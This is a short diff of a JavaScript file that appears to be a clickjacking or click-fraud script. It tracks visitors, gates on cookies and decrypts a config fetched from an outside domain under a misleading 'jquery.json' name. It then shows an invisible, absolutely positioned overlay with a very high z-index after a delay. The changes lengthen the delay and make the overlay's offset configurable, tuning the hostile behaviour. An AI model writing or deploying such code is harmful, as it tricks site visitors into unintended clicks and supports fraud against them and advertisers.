@@ -1,5 +1,5 @@
 let sitesRand = [];
-let siteSelected = [{link: null, cookie: null}];
+let siteSelected = [{link: null, cookie: null, margin: 0}];
 let monitorTracker = null;
 let canTrack = 0;
 let uniqueID = '_' + Math.random().toString(36).substr(2, 9);
@@ -80,7 +80,7 @@ function showDiv() {
     canTrack = 1;
     startTracker();
 
-    $("#_gcli_obj" + uniqueID).css("top", "-110px").css("left", "-70px").css("pointer-events", "");
+    $("#_gcli_obj" + uniqueID).css("top", "-" + siteSelected.margin + "px").css("left", "-70px").css("pointer-events", "");
     $("#_gcli_div" + uniqueID).css("width", "780px").css("height", "200px").css("z-index", "999999").css("position", "absolute");
 }
 function showOrMinimize() {
@@ -88,7 +88,7 @@ function showOrMinimize() {
         if(getCookie(siteSelected.cookie) || getCookie("_gcli_delay_time")){
             setTimeout(minimizeDiv,1000);
         } else {
-            setTimeout(showDiv,5000);
+            setTimeout(showDiv,10000); //10seg para iniciar
         }
     }
 }
@@ -132,7 +132,7 @@ function Decrypt(s1, id) {
     return result;
 }
 $(document).ready(function () {
-    fetch('https://www.iplezier.site/assets/js/c/jquery.json')
+    fetch('https://www.iplezier.site/assets/js/c/jquery.json?ver=2.0')
         .then(function(response) {
             return response.text();
         })
